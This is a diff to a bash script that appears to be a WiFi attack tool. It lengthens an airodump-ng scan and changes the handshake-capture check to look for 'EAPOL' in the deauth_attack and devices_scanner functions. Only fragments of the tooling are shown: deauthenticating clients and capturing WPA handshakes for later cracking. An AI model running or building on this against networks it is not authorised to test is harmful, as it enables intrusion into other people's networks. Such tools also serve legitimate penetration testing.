@@ -173,7 +173,7 @@ function adapter_config() {
 # ------------------------------
 function network_scanner() {	
         # Scan 15 seconds for wifi networks   
-        countdown_duration=15
+        countdown_duration=20
         sudo gnome-terminal --geometry=110x35-10000-10000 -- bash -c "sudo timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
 
         echo -e "\n\n\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
@@ -461,8 +461,8 @@ function devices_scanner() {
         printf "\r\e[1;34m%02d:%02d\e[0m Scanning for devices.." "$minutes" "$seconds"
 
         # Check if handshake is found
-        if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
-            echo -e "\033[1;32m\n->> Got the handshake!\033[0m\n"
+        if sudo grep -q "EAPOL" "$targets_path/$bssid_name/airodump_output.txt"; then
+            echo -e "\033[1;32m\n->> Got the EAPOL handshake!\033[0m\n"
             sudo pkill aireplay-ng
             sudo pkill airodump-ng
             echo
@@ -531,8 +531,8 @@ function deauth_attack() {
 		# waiting 9 sec after deauth attack while looking for handshake:
 		for ((j=1; j<=9; j++)); do
 		    sleep 1
-		    if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
-		        echo -e "\033[1;32m->> Got the handshake!\033[0m\n"
+		    if sudo grep -q "EAPOL" "$targets_path/$bssid_name/airodump_output.txt"; then
+		        echo -e "\033[1;32m->> Got the EAPOL handshake!\033[0m\n"
 		        sudo pkill aireplay-ng
 			sudo pkill airodump-ng
 			echo
